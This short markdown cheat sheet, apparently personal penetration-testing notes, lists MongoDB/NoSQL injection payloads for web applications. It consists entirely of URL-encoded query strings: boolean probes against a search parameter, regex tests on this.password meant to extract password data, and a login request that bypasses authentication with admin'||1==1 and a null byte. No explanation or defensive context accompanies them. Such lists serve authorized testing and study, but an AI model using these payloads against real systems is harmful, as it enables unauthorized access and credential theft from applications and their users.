## MongoDB Injection Random Notes

- /?search=admin'%26%26'1'=='2'%00
- /?search=admin'%26%26this.password%26%26this.password.match(/.\*/)%00
- /?search=admin%27%26%26this.password.match%28%2F.%5C%2A%2F%29%00
- /?search=admin'%20%26%26%20this.password.match(/.\*/)%00
- /?search=admin'%20%26%26%20this.passwordzz.match(/.\*/)%00

- GET /?username=admin'||1==1%00&password=password&submit=Submit HTTP/1.1  # ' || 1==1 %00